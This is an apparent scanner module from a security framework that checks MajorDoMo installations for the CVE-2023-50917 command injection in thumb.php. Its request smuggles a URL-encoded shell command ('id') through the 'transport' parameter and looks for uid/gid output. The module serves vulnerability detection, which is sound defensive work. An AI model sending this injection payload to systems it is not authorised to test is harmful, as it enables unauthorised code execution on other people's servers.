#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""MajorDoMo (aka Major Domestic Module) before 0662e5e allows command execution via thumb."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'MajorDoMo thumb.php - OS Command Injection Detection',
        'description': 'MajorDoMo (aka Major Domestic Module) before 0662e5e allows command execution via thumb.php shell metacharacters. NOTE: this is unrelated to the Majordomo mailing-list manager.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'packetstorm', 'seclists', 'cve2023', 'majordomo', 'rce', 'os', 'mjdm', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'http://packetstormsecurity.com/files/176273/MajorDoMo-Remote-Code-Execution.html',
            'http://seclists.org/fulldisclosure/2023/Dec/19',
            'https://github.com/sergejey/majordomo/commit/0662e5ebfb133445ff6154b69c61019357092178',
            'https://github.com/sergejey/majordomo/commit/3ec3ffb863ea3c2661ab27d398776c551f4daaac',
            'https://nvd.nist.gov/vuln/detail/CVE-2023-50917',
        ],
        'cve': 'CVE-2023-50917',
    }

    def run(self):
        r = self.http_request(method="GET", path='/modules/thumb/thumb.php?url=cnRzcDovL2EK&debug=1&transport=%7C%7C+%28echo+%27%5BS%5D%27%3B+id%3B+echo+%27%5BE%5D%27%29%23%3B', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('uid=([0-9(a-z)]+) gid=([0-9(a-z)]+)', 'rtsp_transport',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='critical',
                reason="MajorDoMo thumb.php - OS Command Injection detected",
                path='/modules/thumb/thumb.php?url=cnRzcDovL2EK&debug=1&transport=%7C%7C+%28echo+%27%5BS%5D%27%3B+id%3B+echo+%27%5BE%5D%27%29%23%3B',
            )
            return True
        return False

